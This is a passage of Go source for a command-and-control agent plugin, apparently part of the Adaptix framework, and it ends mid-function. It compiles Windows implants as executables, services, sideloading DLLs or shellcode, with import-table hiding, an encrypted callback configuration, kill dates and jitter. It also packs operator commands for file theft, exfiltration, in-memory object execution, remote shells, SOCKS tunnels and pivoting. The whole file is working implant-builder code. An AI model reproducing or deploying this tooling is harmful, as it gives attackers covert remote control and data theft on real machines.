package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_TCP, channelId, tunnelType, address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_UDP, channelId, address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, channelId, len(data), data}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, channelId, len(data), data}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_PAUSE, channelId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_RESUME, channelId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_CLOSE, channelId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_REVERSE, tunnelId, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	programArgs := Ts.TsConvertUTF8toCp(program, oemCP)
	array := []interface{}{COMMAND_SHELL_START, terminalId, programArgs}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	dataEncode := Ts.TsConvertUTF8toCp(string(data), oemCP)
	if oemCP > 0 {
		dataEncode = strings.ReplaceAll(dataEncode, "\n", "\r\n")
	}
	array := []interface{}{COMMAND_SHELL_WRITE, terminalId, len(dataEncode), []byte(dataEncode)}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_JOBS_KILL, terminalId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os                 string `json:"os"`
	Arch               string `json:"arch"`
	Format             string `json:"format"`
	Sleep              string `json:"sleep"`
	Jitter             int    `json:"jitter"`
	SvcName            string `json:"svcname"`
	IsKillDate         bool   `json:"is_killdate"`
	Killdate           string `json:"kill_date"`
	Killtime           string `json:"kill_time"`
	IsWorkingTime      bool   `json:"is_workingtime"`
	StartTime          string `json:"start_time"`
	EndTime            string `json:"end_time"`
	IatHiding          bool   `json:"iat_hiding"`
	IsSideloading      bool   `json:"is_sideloading"`
	SideloadingContent string `json:"sideloading_content"`
	DnsResolvers       string `json:"dns_resolvers"`
	DohResolvers       string `json:"doh_resolvers"`
	DnsMode            string `json:"dns_mode"`
	UserAgent          string `json:"user_agent"`
	UseProxy           bool   `json:"use_proxy"`
	ProxyType          string `json:"proxy_type"`
	ProxyHost          string `json:"proxy_host"`
	ProxyPort          int    `json:"proxy_port"`
	ProxyUsername      string `json:"proxy_username"`
	ProxyPassword      string `json:"proxy_password"`
	RotationMode       string `json:"rotation_mode"`
}

var (
	ObjectDir_http = "objects_http"
	ObjectDir_smb  = "objects_smb"
	ObjectDir_tcp  = "objects_tcp"
	ObjectDir_dns  = "objects_dns"
	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
)

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		/// START CODE HERE

		var (
			generateConfig GenerateConfig
			params         []interface{}
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		kill_date := 0
		if generateConfig.IsKillDate {
			dt := generateConfig.Killdate + " " + generateConfig.Killtime
			t, err := time.Parse("02.01.2006 15:04:05", dt)
			if err != nil {
				err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
				return nil, err
			}
			kill_date = int(t.Unix())
		}

		working_time := 0
		if generateConfig.IsWorkingTime {
			t := generateConfig.StartTime + "-" + generateConfig.EndTime
			working_time, err = parseStringToWorkingTime(t)
			if err != nil {
				return nil, err
			}
		}

		encrypt_key, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		switch protocol {

		case "http":

			var Hosts []string
			var Ports []int
			hosts_agent, _ := listenerMap["callback_addresses"].(string)
			lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}

				host, portStr, _ := net.SplitHostPort(line)
				port, _ := strconv.Atoi(portStr)

				Hosts = append(Hosts, host)
				Ports = append(Ports, port)
			}
			c2Count := len(Hosts)

			HttpMethod, _ := listenerMap["http_method"].(string)
			Ssl, _ := listenerMap["ssl"].(bool)
			UriRaw, _ := listenerMap["uri"].(string)
			ParameterName, _ := listenerMap["hb_header"].(string)
			UserAgentRaw, _ := listenerMap["user_agent"].(string)
			RequestHeaders, _ := listenerMap["request_headers"].(string)
			HostHeaderRaw, _ := listenerMap["host_header"].(string)

			// Parse multi-value fields (newline-separated)
			var Uris []string
			for _, u := range strings.Split(UriRaw, "\n") {
				u = strings.TrimSpace(u)
				if u != "" {
					Uris = append(Uris, u)
				}
			}
			if len(Uris) == 0 {
				Uris = append(Uris, UriRaw)
			}

			var UserAgents []string
			for _, ua := range strings.Split(UserAgentRaw, "\n") {
				ua = strings.TrimSpace(ua)
				if ua != "" {
					UserAgents = append(UserAgents, ua)
				}
			}
			if len(UserAgents) == 0 {
				UserAgents = append(UserAgents, UserAgentRaw)
			}

			var HostHeaders []string
			for _, hh := range strings.Split(HostHeaderRaw, "\n") {
				hh = strings.TrimSpace(hh)
				if hh != "" {
					HostHeaders = append(HostHeaders, hh)
				}
			}

			// Strip "Host: ...\r\n" from RequestHeaders (agent handles host header separately)
			if len(HostHeaders) > 0 {
				lines := strings.Split(RequestHeaders, "\r\n")
				var filtered []string
				for _, line := range lines {
					if !strings.HasPrefix(strings.ToLower(line), "host:") {
						filtered = append(filtered, line)
					}
				}
				RequestHeaders = strings.Join(filtered, "\r\n")
			}

			WebPageOutput, _ := listenerMap["page-payload"].(string)
			ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
			ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])

			rotationMode := 0 // 0=sequential, 1=random
			if generateConfig.RotationMode == "random" {
				rotationMode = 1
			}

			seconds, err := parseDurationToSeconds(generateConfig.Sleep)
			if err != nil {
				return nil, err
			}

			params = append(params, int(agentWatermark))
			params = append(params, Ssl)
			params = append(params, c2Count)
			for i := 0; i < c2Count; i++ {
				params = append(params, Hosts[i])
				params = append(params, Ports[i])
			}
			params = append(params, HttpMethod)
			params = append(params, len(Uris))
			for _, u := range Uris {
				params = append(params, u)
			}
			params = append(params, ParameterName)
			params = append(params, len(UserAgents))
			for _, ua := range UserAgents {
				params = append(params, ua)
			}
			params = append(params, RequestHeaders)
			params = append(params, ansOffset1)
			params = append(params, ansOffset2)
			params = append(params, len(HostHeaders))
			for _, hh := range HostHeaders {
				params = append(params, hh)
			}
			params = append(params, rotationMode)
			proxyType := 0 // 0=none, 1=http, 2=https
			if generateConfig.UseProxy {
				if generateConfig.ProxyType == "https" {
					proxyType = 2
				} else {
					proxyType = 1 // default to http
				}
			}
			params = append(params, proxyType)
			params = append(params, generateConfig.ProxyHost)
			params = append(params, generateConfig.ProxyPort)
			params = append(params, generateConfig.ProxyUsername)
			params = append(params, generateConfig.ProxyPassword)
			params = append(params, kill_date)
			params = append(params, working_time)
			params = append(params, seconds)
			params = append(params, generateConfig.Jitter)

		case "bind_smb":

			pipename, _ := listenerMap["pipename"].(string)
			pipename = "\\\\.\\pipe\\" + pipename

			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)

			params = append(params, int(agentWatermark))
			params = append(params, pipename)
			params = append(params, int(lWatermark))
			params = append(params, kill_date)

		case "bind_tcp":
			prepend, _ := listenerMap["prepend_data"].(string)
			port, _ := listenerMap["port_bind"].(float64)

			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)

			params = append(params, int(agentWatermark))
			params = append(params, prepend)
			params = append(params, int(port))
			params = append(params, int(lWatermark))
			params = append(params, kill_date)

		case "dns":
			userAgent := generateConfig.UserAgent
			if userAgent == "" {
				userAgent = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"
			}
			params, err = buildDNSProfileParams(generateConfig, listenerMap, transportProfile.Watermark, agentWatermark, kill_date, working_time, userAgent)
			if err != nil {
				return nil, err
			}

		default:
			return nil, errors.New("protocol unknown")
		}

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}

		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile, err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}

		profileString := ""
		for _, b := range packedProfile {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))

		/// END CODE HERE
	}
	return agentProfiles, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	/// START CODE HERE

	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("only one listener profile is supported")
	}
	listenerProfile := profile.ListenerProfiles[0].Profile
	agentProfile := agentProfiles[0]

	var listenerMap map[string]any
	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
		return nil, "", err
	}

	var (
		generateConfig GenerateConfig
		ConnectorFile  string
		ObjectDir      string
		Compiler       string
		Ext            string
		stubPath       string
		buildPath      string
		cmdConfig      string
	)

	cFlags := CFlags
	lFlags := LFlags
	postLibs := ""

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	// IAT Hiding: -nostdlib eliminates CRT, custom crt.cpp provides replacements
	if generateConfig.IatHiding {
		cFlags += " -DIAT_HIDING"
		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	protocol, _ := listenerMap["protocol"].(string)
	if protocol == "http" {
		ObjectDir = ObjectDir_http
		ConnectorFile = "ConnectorHTTP"
	} else if protocol == "bind_smb" {
		ObjectDir = ObjectDir_smb
		ConnectorFile = "ConnectorSMB"
	} else if protocol == "bind_tcp" {
		ObjectDir = ObjectDir_tcp
		ConnectorFile = "ConnectorTCP"
	} else if protocol == "dns" {
		ObjectDir = ObjectDir_dns
		ConnectorFile = "ConnectorDNS"
	} else {
		return nil, "", errors.New("protocol unknown")
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))

	if generateConfig.Arch == "x86" {
		Compiler = "i686-w64-mingw32-g++"
		Ext = ".x86.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
		Filename = "agent.x86"
	} else {
		Compiler = "x86_64-w64-mingw32-g++"
		Ext = ".x64.o"
		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
		Filename = "agent.x64"
	}

	svcName := ""
	for _, char := range generateConfig.SvcName {
		svcName += fmt.Sprintf("\\x%02x", char)
	}

	agentProfileSize := len(agentProfile) / 4
	if generateConfig.Format == "Service Exe" {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DBUILD_SVC -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, svcName, string(agentProfile), agentProfileSize, tempDir)
	} else {
		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")

	var buildArgsConfig []string
	buildArgsConfig = append(buildArgsConfig, "-c", cmdConfig)
	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", buildArgsConfig...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")

	Files := tempDir + "/config.o "
	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
	for _, ofile := range ObjectFiles {
		Files += ObjectDir + "/" + ofile + Ext + " "
	}
	if protocol == "dns" {
		Files = appendDNSObjectFiles(Files, ObjectDir, Ext)
	}

	if generateConfig.Format == "Exe" {
		Files += ObjectDir + "/main" + Ext
		buildPath = tempDir + "/file.exe"
		Filename += ".exe"
		if generateConfig.IatHiding {
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_WinMain@16"
			} else {
				lFlags += " -Wl,-e,WinMain"
			}
		}
	} else if generateConfig.Format == "Service Exe" {
		Files += ObjectDir + "/main_service" + Ext
		buildPath = tempDir + "/svc.exe"
		Filename = "svc_" + Filename + ".exe"
		if generateConfig.IatHiding {
			postLibs += " -ladvapi32"
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_main"
			} else {
				lFlags += " -Wl,-e,main"
			}
		}
	} else if generateConfig.Format == "DLL" {
		Files += ObjectDir + "/main_dll" + Ext
		lFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".dll"
		if generateConfig.IatHiding {
			postLibs += " -lkernel32"
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_DllMain@12"
			} else {
				lFlags += " -Wl,-e,DllMain"
			}
		}
		if generateConfig.IsSideloading {
			sideloadingContent, err := base64.StdEncoding.DecodeString(generateConfig.SideloadingContent)
			if err != nil {
				return nil, "", errors.New("unknown sideloading DLL format")
			}
			defPath, err := CreateDefinitionFile(sideloadingContent, tempDir)
			if err != nil {
				return nil, "", err
			}
			lFlags += " " + defPath
		}
	} else if generateConfig.Format == "Shellcode" {
		Files += ObjectDir + "/main_shellcode" + Ext
		lFlags += " -shared"
		buildPath = tempDir + "/file.dll"
		Filename += ".bin"
		if generateConfig.IatHiding {
			if generateConfig.Arch == "x86" {
				lFlags += " -Wl,-e,_DllMain@12"
			} else {
				lFlags += " -Wl,-e,DllMain"
			}
		}
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown file format")
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")

	var buildArgs []string
	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
	buildArgs = append(buildArgs, strings.Fields(Files)...)
	if postLibs != "" {
		buildArgs = append(buildArgs, strings.Fields(postLibs)...)
	}
	buildArgs = append(buildArgs, "-o", buildPath)

	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	buildContent, err := os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)

	if generateConfig.Format == "Shellcode" {
		stubContent, err := os.ReadFile(stubPath)
		if err != nil {
			return nil, "", err
		}
		Payload = append(stubContent, buildContent...)
	} else {
		Payload = buildContent
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))

	/// END CODE HERE

	return Payload, Filename, nil
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agentData, nil, errors.New("error agentData data")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agentData.SessionKey = packer.ParseBytes()
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)

	/// END CODE

	return agentData, &ExtenderAgent{}, nil
}

// Extender methods

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return RC4Crypt(data, key)
	/// END CODE
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return RC4Crypt(data, key)
	/// END CODE
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {

	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error = nil
	)

	/// START CODE HERE

	id, _ := strconv.ParseInt(pivotId, 16, 64)
	array := []interface{}{COMMAND_PIVOT_EXEC, int(id), len(data), data}
	packData, _ = PackArray(array)

	/// END CODE

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var array []interface{}

	switch command {

	case "cat":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cd":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cp":
		var src string
		var dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_COPY, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "disks":
		array = []interface{}{COMMAND_DISKS}

	case "download":
		var path string
		path, err = getStringArg(args, "file")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "execute":
		if subcommand == "bof" {
			var bofFile string
			var bofContent []byte
			var params []byte

			taskData.Type = adaptix.TASK_TYPE_JOB

			bofFile, err = getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
					params = append(params, 0)
				}
			}

			array = []interface{}{COMMAND_EXEC_BOF, "go", len(bofContent), bofContent, len(params), params}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exfil":
		var fid string
		var fileId int64

		fid, err = getStringArg(args, "file_id")
		if err != nil {
			goto RET
		}
		fileId, err = strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "getuid":
		array = []interface{}{COMMAND_GETUID}

	case "jobs":
		if subcommand == "list" {
			array = []interface{}{COMMAND_JOB_LIST}

		} else if subcommand == "kill" {
			var job string
			var jobId int64

			job, err = getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
